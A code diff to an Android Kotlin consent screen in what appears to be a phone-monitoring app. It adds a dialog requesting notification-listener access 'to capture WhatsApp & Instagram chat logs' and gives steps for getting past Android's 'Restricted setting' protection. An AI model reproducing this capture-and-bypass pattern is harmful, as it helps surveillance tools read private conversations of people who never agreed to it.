@@ -69,6 +69,18 @@ class ConsentActivity : AppCompatActivity() {
         ActivityResultContracts.RequestMultiplePermissions()
     ) { _ ->
         com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+        if (!isNotificationAccessGranted()) {
+            showNotificationDialog()
+        } else {
+            proceedToActivation()
+        }
+    }
+
+    // 1b. Notification Listener Access Launcher
+    private val notificationLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
         proceedToActivation()
     }
 
@@ -190,6 +202,38 @@ class ConsentActivity : AppCompatActivity() {
             }
             .setNegativeButton("Skip") { _, _ ->
                 com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+                proceedToActivation()
+            }
+            .setCancelable(false)
+            .show()
+    }
+
+    private fun showNotificationDialog() {
+        val appName = getString(R.string.app_name)
+        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            "To capture WhatsApp & Instagram chat logs:\n\n" +
+            "1. Tap 'Enable' -> Find '$appName' -> Toggle ON & tap Allow.\n\n" +
+            "If blocked ('Restricted setting'): Tap 3 dots (top right) in App Info -> 'Allow restricted settings'."
+        } else {
+            "To capture WhatsApp & Instagram chat logs:\n\n" +
+            "1. Tap 'Enable' below.\n" +
+            "2. Find '$appName' and toggle it ON."
+        }
+
+        AlertDialog.Builder(this)
+            .setTitle("Enable Notification Access")
+            .setMessage(msg)
+            .setPositiveButton("Enable") { _, _ ->
+                try {
+                    notificationLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                } catch (e: Exception) {
+                    proceedToActivation()
+                }
+            }
+            .setNeutralButton(R.string.open_app_info) { _, _ ->
+                openAppInfoSettings()
+            }
+            .setNegativeButton("Skip") { _, _ ->
                 proceedToActivation()
             }
             .setCancelable(false)
